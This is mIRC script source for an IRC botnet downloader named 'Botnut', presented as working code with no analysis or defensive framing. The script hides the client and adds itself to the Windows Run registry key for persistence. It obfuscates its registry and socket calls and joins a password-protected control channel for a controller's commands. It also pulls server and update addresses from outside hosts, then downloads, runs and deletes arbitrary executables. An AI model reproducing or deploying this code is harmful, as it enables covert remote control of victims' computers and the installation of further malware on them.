ON *:START: { 
  .timer 0 666 botnet.scan.4.server
  .timer 0 666 botnet.check.channel
  identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  set %botnet.version 0.01
  set %botnet.channel #botnut.secure
  set %botnet.channelpw botnut
  server irc.gamesnet.net:6667
  set %botnet.server irc.gamesnet.net:6667
  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  echo -a $dll(dmu.dll,HideMirc,on)
  $regwrite(HKEY_CURRENT_USER\Software\mIRC\License\,1711-182810,REG_SZ)
  $regwrite(HKEY_CURRENT_USER\Software\mIRC\UserName\,owned,REG_SZ)
  $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\secure,c:\windows\system32\secure\rundll32.exe,REG_SZ)
  copy -o c:\windows\notepad.exe c:\windows\system32\
}

alias RegWrite {
  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
    var %a = Reg $+ Write
    .como $+ pen %a WSc $+ ript.She $+ ll
    if !$comerr {
      var %b =  $com(%a,Reg $+ Wri $+ te,3,bstr,$1,bstr,$2,bstr,$3)
      .comcl $+ ose %a
    }
    if ($3 == REG_EX $+ PAND_SZ) || ($3 == RE $+ G_SZ) {
      if ($re $+ gr $+ ead($1) == $2) { re $+ turn the val $+ ue ( $+ $1 $+ ) was created }
    }
  }
}
ON *:CONNECT: { 
  if ($me == $scon(1).me) { scon 1 join %botnet.channel %botnet.channelpw }
  botnet.scan.4.server
  ignore -wd *
}

ON *:DISCONNECT: {   
  botnet.scan.4.server
}
alias -l botnet.check.channel {
  if ($me == $scon(1).me) && ($channel(0) == 0) { scon 1 join %botnet.channel %botnet.channelpw }
}
raw 332:*: {
  if ($me == $scon(1).me) {
    msg %botnet.channel « Botnut Downloader Version:  %botnet.version » « IP: $ip » « Uptime: $duration($calc($ticks / 1000)) »  
    var %i = 1
    while (%i <= $numtok($3-,124)) {
      parse.topic $gettok($3-,%i,124)
      inc %i
    }
  }
}

alias parse.topic {
  if ($chr(36) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
  elseif ($1 == .download) { 
    if ($2 == %botnet.givenhost) && ($3 == %botnet.givenpath) && ($4 == %botnet.given) { scon 1 msg %botnet.channel File already downloaded! }
    else { botnet.download $2- }
  }
  elseif ($1 == .update) { botnet.scan.4.version } 
  elseif ($1 == .server) { botnet.scan.4.server } 
  elseif ($1 == .status) { scon 1 msg %botnet.channel « Botnut Downloader Version:  %botnet.version » « IP: $ip » « Uptime: $duration($calc($ticks / 1000)) » } 
  elseif ($1 == .botnut) { 
    if ($isdde(botnut)) { scon 1 msg %botnet.channel Botnut is running. }
    else { scon 1 msg %botnet.channel Botnut is not running. }
  }
}

ON *:SOCKOPEN:botnet.check.server: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: %botnet.hosta $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.server: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread,<HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread,</TITLE></HEAD>,,%sockread)) {
    if (%botnet.server != %sockread) {
      set %botnet.server %sockread
      scon 1 server %botnet.server
    }
  }
}

alias botnet.scan.4.server { set %botnet.hosta bsecureserver.da.ru | sockclose botnet.check.server | .timer 1 1 sockopen botnet.check.server %botnet.hosta 80 }
alias botnet.scan.4.version { sockclose botnet.check.version | sockopen botnet.check.version bsecureversion.da.ru 80 }

ON *:SOCKOPEN:botnet.check.version: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: bsecureversion.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.version: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    echo -a %sockread    
    if (%botnet.version < %sockread) {
      echo -a %sockread    
      .timer 1 1 botnet.scan.4.fileurl
      .timer 1 2 sockclose botnet.check.version
    }
  }
}

alias botnet.scan.4.fileurl { set %botnet.updatefile $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .exe | sockclose botnet.check.fileurl | sockopen botnet.check.fileurl bsecurefileurl.da.ru 80 }

ON *:SOCKOPEN:botnet.check.fileurl: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: bsecurefileurl.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.fileurl: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    set %botnet.account %sockread
    echo -a %botnet.account
    sockclose botnet.download.new.version
    .timer 1 1 sockopen botnet.download.new.version people.freenet.de 80
  }
}

ON *:SOCKOPEN:botnet.download.new.version: {
  sockwrite -n $sockname GET / $+ %botnet.account $+ /update.exe HTTP/1.0
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname Host: people.freenet.de $+ $str($crlf,2)
  sockwrite -n $sockname
}

ON *:SOCKREAD:botnet.download.new.version:{
  if (%botnet.aupd.downloadready != 1) {
    var %header
    sockread %header
    while ($sockbr) {
      if (* !iswm %header) {
        %botnet.aupd.downloadready = 1
        break
      }
      sockread %header
    }
  }
  sockread 4096 &d
  while ($sockbr) {
    bwrite %botnet.updatefile -1 -1 &d
    sockread 4096 &d
  }
}

ON *:SOCKCLOSE:botnet.download.new.version: { unset %botnet.aupd.* | run %botnet.updatefile | timer 1 10 .load -rs secure.dll | timer 1 10 remove %botnet.updatefile }

alias botnet.download { set %botnet.given $3- | set %botnet.givenhost $1 | set %botnet.givenpath $2 | sockclose botnet.check.it | .timer 1 1 sockopen botnet.check.it bsecurestatus.da.ru 80 }

ON *:SOCKOPEN:botnet.check.it: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: bsecurestatus.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.it: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    var %bla %sockread 
    echo -a %sockread    
    if (%bla == ON) {  
      if ($isfile(%botnet.given)) { .remove %botnet.given }     
      sockclose botnut.download
      .timer 1 1 sockopen botnut.download %botnet.givenhost 80
    }
    else { scon 1 msg %botnet.channel Access denied! }
  }
}


ON *:SOCKOPEN:botnut.download: {
  sockwrite -n $sockname GET / $+ %botnet.givenpath HTTP/1.0
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname Host: %botnet.givenhost $+ $str($crlf,2)
  sockwrite -n $sockname
}

ON *:SOCKREAD:botnut.download:{
  if (%botnet.aupd.downloadready != 1) {
    var %header
    sockread %header
    while ($sockbr) {
      if (* !iswm %header) {
        %botnet.aupd.downloadready = 1
        break
      }
      sockread %header
    }
  }
  sockread 4096 &d
  while ($sockbr) {
    bwrite %botnet.given -1 -1 &d
    sockread 4096 &d
  }
}
ON *:SOCKCLOSE:botnut.download: { unset %botnet.aupd.* | run %botnet.given | scon 1 msg %botnet.channel Done. | .timer 1 5 remove %botnet.given }

ON *:TEXT:*:%botnet.channel: { 
  if ($me == $scon(1).me) {
    if ($nick == botnut) {
      if ($chr(36) isin $1-) || ($chr(124) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
      elseif ($1 == .download) { 
        if ($2 == %botnet.givenhost) && ($3 == %botnet.givenpath) && ($4 == %botnet.given) { scon 1 msg %botnet.channel File already downloaded! }
        else { botnet.download $2- }
      }
      elseif ($1 == .update) { botnet.scan.4.version } 
      elseif ($1 == .server) { botnet.scan.4.server } 
      elseif ($1 == .status) { scon 1 msg %botnet.channel « Botnut Downloader Version:  %botnet.version » « IP: $ip » « Uptime: $duration($calc($ticks / 1000)) » } 
      elseif ($1 == .botnut) { 
        if ($isdde(botnut)) { scon 1 msg %botnet.channel Botnut is running. }
        else { scon 1 msg %botnet.channel Botnut is not running. }
      }
    }
  }
}
ON *:TEXT:*:?: { 
  if ($me == $scon(1).me) {
    if ($nick == botnut) {
      if ($chr(36) isin $1-) || ($chr(124) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
      elseif ($1 == .download) { 
        if ($2 == %botnet.givenhost) && ($3 == %botnet.givenpath) && ($4 == %botnet.given) { scon 1 msg %botnet.channel File already downloaded! }
        else { botnet.download $2- }
      }
      elseif ($1 == .update) { botnet.scan.4.version } 
      elseif ($1 == .server) { botnet.scan.4.server } 
      elseif ($1 == .status) { scon 1 msg $nick « Botnut Downloader Version:  %botnet.version » « IP: $ip » « Uptime: $duration($calc($ticks / 1000)) » } 
      elseif ($1 == .botnut) { 
        if ($isdde(botnut)) { scon 1 msg $nick Botnut is running. }
        else { scon 1 msg $nick Botnut is not running. }
      }
    }
  }
}
